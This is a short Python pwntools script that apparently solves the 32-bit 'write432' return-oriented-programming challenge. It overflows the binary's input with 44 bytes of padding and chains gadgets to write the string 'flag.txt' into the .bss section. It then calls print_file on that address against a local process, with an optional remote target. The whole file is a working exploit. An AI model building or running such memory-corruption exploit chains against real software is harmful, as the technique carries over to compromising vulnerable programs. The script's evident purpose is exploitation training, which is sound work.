import pwn

#pwn.context.log_level = "debug"
remote = False

IP = ""
PORT = ""
FILENAME = "./write432"

if remote:
    p = pwn.remote(IP, PORT)
    elf = pwn.ELF(FILENAME)
else:
    p = pwn.process(FILENAME)
    elf = p.elf

libc = pwn.ELF("libwrite432.so")

bss_start = elf.sym["__bss_start"]
print_file = elf.sym["print_file"]
double_pop = pwn.pack(0x080485aa) # pop edi; pop ebp; ret;
mov = pwn.pack(0x08048543) # mov dword ptr [edi], ebp; ret;

p.recvuntil("> ")

payload = pwn.cyclic(44)

# write "flag.txt" to bss_start
# start with "flag", write to bss_start
# mov the written string into dword [edi]
payload += double_pop
payload += pwn.pack(bss_start)
payload += pwn.pack(0x67616c66) # "flag"
payload += mov

# write ".txt" to bss_start + 0x4
payload += double_pop
payload += pwn.pack(bss_start + 0x4)
payload += pwn.pack(0x7478742e) # ".txt"
payload += mov

payload += pwn.pack(print_file)
payload += b"JAME"
payload += pwn.pack(bss_start)

p.sendline(payload)


p.interactive()
